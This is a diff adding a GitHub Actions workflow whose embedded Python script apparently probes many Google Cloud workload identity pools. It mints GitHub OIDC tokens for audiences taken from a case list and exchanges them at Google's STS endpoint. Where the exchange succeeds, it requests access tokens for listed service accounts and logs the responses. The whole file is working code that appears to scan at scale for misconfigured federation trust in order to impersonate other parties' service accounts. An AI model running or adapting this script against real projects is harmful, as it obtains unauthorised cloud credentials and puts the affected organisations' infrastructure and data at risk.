@@ -1,0 +1,112 @@
+name: c211 78644 crosscheck
+on:
+  workflow_dispatch:
+    inputs:
+      chunk:
+        description: 'chunk index'
+        required: false
+        default: '0'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - run: |
+          export CHUNK="${{ github.event.inputs.chunk }}"
+          export NCHUNK="1"
+          export CASEPATH="c211/78644-crosscheck.json"
+          python3 - <<'PY'
+
+          import os, json, subprocess, urllib.request, urllib.error, urllib.parse, time, sys
+
+          CHUNK = int(os.environ.get('CHUNK', '0'))
+          NCHUNK = int(os.environ.get('NCHUNK', '1'))
+          CASEPATH = os.environ.get('CASEPATH', 'c211/78644-crosscheck.json')
+
+          def load():
+              url = 'https://api.github.com/repos/%s/contents/%s' % (os.environ['GITHUB_REPOSITORY'], CASEPATH)
+              r = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + os.environ['GITHUB_TOKEN'],
+                                                       'Accept': 'application/vnd.github.raw'})
+              return json.loads(urllib.request.urlopen(r, timeout=60).read())
+
+          def mint(aud):
+              base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              if not base:
+                  return ''
+              u = base + '&audience=' + urllib.parse.quote(aud, safe='')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u],
+                                   capture_output=True, text=True).stdout
+              try:
+                  return json.loads(out).get('value', '')
+              except Exception:
+                  return ''
+
+          def req(u, data=None, token=None, timeout=60):
+              h = {'Accept': 'application/json', 'Content-Type': 'application/json'}
+              if token:
+                  h['Authorization'] = 'Bearer ' + token
+              r = urllib.request.Request(u, data=data, headers=h)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() or b'').decode('utf-8', 'replace')
+              except Exception as e:
+                  return -1, repr(e)[:160]
+
+          def sts(aud, tok):
+              body = json.dumps({'audience': aud,
+                                 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                                 'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                                 'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                                 'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+                                 'subjectToken': tok}).encode()
+              return req('https://sts.googleapis.com/v1/token', data=body)
+
+          def gen(acc, email):
+              body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform']}).encode()
+              return req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(email, safe=''),
+                         data=body, token=acc)
+
+          cases = load()
+          mine = cases[CHUNK::NCHUNK] if NCHUNK > 1 else cases
+          print('CHUNK %d/%d cases %d/%d' % (CHUNK, NCHUNK, len(mine), len(cases)), flush=True)
+          t0 = time.time()
+          for idx, c in enumerate(mine):
+              p = c['path']
+              rec = {'path': p, 'orig': c.get('orig'), 'alt': c.get('alt'), 'mode': c.get('mode'),
+                     'mint': '', 'sts': None, 'body': '', 'gen': []}
+              auds = ['//iam.googleapis.com/' + p] + (c.get('extra_auds') or [])
+              fed = None
+              for aud in auds:
+                  tok = mint(aud)
+                  if not tok:
+                      rec['mint'] = 'MINT_FAIL'
+                      continue
+                  st, body = sts(aud, tok)
+                  rec['aud'] = aud
+                  rec['sts'] = st
+                  rec['body'] = body.replace('\n', ' ')[:400]
+                  if st == 200:
+                      try:
+                          fed = json.loads(body).get('access_token')
+                      except Exception:
+                          fed = None
+                      break
+                  # only try extra audience if default returned invalid_target-like error
+                  if 'invalid_target' not in body:
+                      break
+              if fed:
+                  for email in (c.get('sas') or [])[:5]:
+                      st, body = gen(fed, email)
+                      rec['gen'].append([email, st, body.replace('\n', ' ')[:300]])
+              print('RESULT ' + json.dumps(rec, sort_keys=True), flush=True)
+              if idx % 25 == 0:
+                  print('PROGRESS %d %ds' % (idx, int(time.time() - t0)), flush=True)
+          print('DONE', flush=True)
+
+          PY
